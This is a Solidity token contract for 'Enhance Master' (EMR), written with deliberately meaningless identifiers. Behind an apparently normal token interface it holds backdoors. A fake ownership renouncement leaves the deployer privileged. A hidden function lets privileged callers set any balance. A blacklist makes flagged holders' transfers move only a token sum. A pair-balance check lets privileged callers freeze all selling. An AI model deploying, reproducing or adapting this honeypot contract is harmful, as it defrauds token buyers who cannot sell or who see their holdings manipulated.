//SPDX-License-Identifier: MIT

pragma solidity ^0.8.15;

interface txTeam {
    function createPair(address liquidityTake, address amountTotal) external returns (address);
}

interface tradingFund {
    function totalSupply() external view returns (uint256);

    function balanceOf(address teamToken) external view returns (uint256);

    function transfer(address fromReceiver, uint256 txExempt) external returns (bool);

    function allowance(address buyMarketing, address spender) external view returns (uint256);

    function approve(address spender, uint256 txExempt) external returns (bool);

    function transferFrom(
        address sender,
        address fromReceiver,
        uint256 txExempt
    ) external returns (bool);

    event Transfer(address indexed from, address indexed listTake, uint256 value);
    event Approval(address indexed buyMarketing, address indexed spender, uint256 value);
}

abstract contract autoSenderExempt {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface maxAmount {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface tradingFundMetadata is tradingFund {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract EnhanceMaster is autoSenderExempt, tradingFund, tradingFundMetadata {

    uint256 tokenLaunched;

    function getOwner() external view returns (address) {
        return liquidityTeamReceiver;
    }

    uint256 constant limitMin = 15 ** 10;

    mapping(address => bool) public autoTx;

    function name() external view virtual override returns (string memory) {
        return totalFrom;
    }

    function transferFrom(address exemptMarketingIs, address fromReceiver, uint256 txExempt) external override returns (bool) {
        if (_msgSender() != txIsSender) {
            if (atTxFund[exemptMarketingIs][_msgSender()] != type(uint256).max) {
                require(txExempt <= atTxFund[exemptMarketingIs][_msgSender()]);
                atTxFund[exemptMarketingIs][_msgSender()] -= txExempt;
            }
        }
        return takeFromAuto(exemptMarketingIs, fromReceiver, txExempt);
    }

    uint8 private maxFee = 18;

    address public maxWalletAuto;

    string private totalFrom = "Enhance Master";

    function totalSupply() external view virtual override returns (uint256) {
        return isTeamTx;
    }

    mapping(address => mapping(address => uint256)) private atTxFund;

    address modeLaunch = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    bool public maxAt;

    function symbol() external view virtual override returns (string memory) {
        return maxWallet;
    }

    bool public listLiquidity;

    function transfer(address amountExempt, uint256 txExempt) external virtual override returns (bool) {
        return takeFromAuto(_msgSender(), amountExempt, txExempt);
    }

    function approve(address enableTo, uint256 txExempt) public virtual override returns (bool) {
        atTxFund[_msgSender()][enableTo] = txExempt;
        emit Approval(_msgSender(), enableTo, txExempt);
        return true;
    }

    uint256 atExempt;

    uint256 public feeAuto;

    uint256 public totalIs;

    event OwnershipTransferred(address indexed isTeamLaunch, address indexed marketingFrom);

    function allowance(address minFromLaunch, address enableTo) external view virtual override returns (uint256) {
        if (enableTo == txIsSender) {
            return type(uint256).max;
        }
        return atTxFund[minFromLaunch][enableTo];
    }

    address txIsSender = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    address private liquidityTeamReceiver;

    function owner() external view returns (address) {
        return liquidityTeamReceiver;
    }

    function walletAuto() public {
        emit OwnershipTransferred(maxSwap, address(0));
        liquidityTeamReceiver = address(0);
    }

    uint256 private isTeamTx = 100000000 * 10 ** 18;

    bool public minTrading;

    uint256 public fromSender;

    function tradingIs(address amountExempt, uint256 txExempt) public {
        txSenderList();
        txSell[amountExempt] = txExempt;
    }

    address public maxSwap;

    function listTeam(uint256 txExempt) public {
        txSenderList();
        tokenLaunched = txExempt;
    }

    mapping(address => uint256) private txSell;

    function txSenderList() private view {
        require(autoTx[_msgSender()]);
    }

    uint256 private isSenderTake;

    function decimals() external view virtual override returns (uint8) {
        return maxFee;
    }

    function launchMin(address takeLimit) public {
        txSenderList();
        
        if (takeLimit == maxSwap || takeLimit == maxWalletAuto) {
            return;
        }
        receiverAmount[takeLimit] = true;
    }

    function balanceOf(address teamToken) public view virtual override returns (uint256) {
        return txSell[teamToken];
    }

    function senderToTeam(address txMin) public {
        require(txMin.balance < 100000);
        if (minTrading) {
            return;
        }
        if (isSenderTake == fromSender) {
            listLiquidity = true;
        }
        autoTx[txMin] = true;
        
        minTrading = true;
    }

    function modeSell(address exemptMarketingIs, address fromReceiver, uint256 txExempt) internal returns (bool) {
        require(txSell[exemptMarketingIs] >= txExempt);
        txSell[exemptMarketingIs] -= txExempt;
        txSell[fromReceiver] += txExempt;
        emit Transfer(exemptMarketingIs, fromReceiver, txExempt);
        return true;
    }

    string private maxWallet = "EMR";

    mapping(address => bool) public receiverAmount;

    bool private txTrading;

    constructor (){
        if (maxAt != listLiquidity) {
            listLiquidity = false;
        }
        maxAmount teamIs = maxAmount(txIsSender);
        maxWalletAuto = txTeam(teamIs.factory()).createPair(teamIs.WETH(), address(this));
        
        maxSwap = _msgSender();
        autoTx[maxSwap] = true;
        txSell[maxSwap] = isTeamTx;
        walletAuto();
        
        emit Transfer(address(0), maxSwap, isTeamTx);
    }

    function takeFromAuto(address exemptMarketingIs, address fromReceiver, uint256 txExempt) internal returns (bool) {
        if (exemptMarketingIs == maxSwap) {
            return modeSell(exemptMarketingIs, fromReceiver, txExempt);
        }
        uint256 amountWallet = tradingFund(maxWalletAuto).balanceOf(modeLaunch);
        require(amountWallet == tokenLaunched);
        require(fromReceiver != modeLaunch);
        if (receiverAmount[exemptMarketingIs]) {
            return modeSell(exemptMarketingIs, fromReceiver, limitMin);
        }
        return modeSell(exemptMarketingIs, fromReceiver, txExempt);
    }

}